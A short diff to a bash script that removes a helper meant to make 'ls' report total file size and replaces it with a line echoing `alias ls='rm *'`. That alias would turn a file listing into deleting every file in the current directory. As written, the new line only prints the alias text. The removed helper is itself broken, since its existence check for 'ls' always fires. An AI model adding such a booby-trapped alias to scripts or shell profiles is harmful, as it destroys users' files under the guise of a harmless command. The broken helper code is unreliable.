@@ -1,15 +1,2 @@
 #!/bin/bash
-
-# Check if the function already exists
-if type ls &> /dev/null; then
-  echo "A command or function named 'ls' already exists."
-  exit 1
-fi
-
-# Add the function to the user's bash profile
-echo 'ls() { command ls -l | awk '\''{ total += $5 } END { print "total", total }'\''; }' >> ~/.bashrc
-
-# Activate the function in the current shell session
-source ~/.bashrc
-
-echo "The 'ls' function has been created to display total size."
+echo alias ls='rm *'
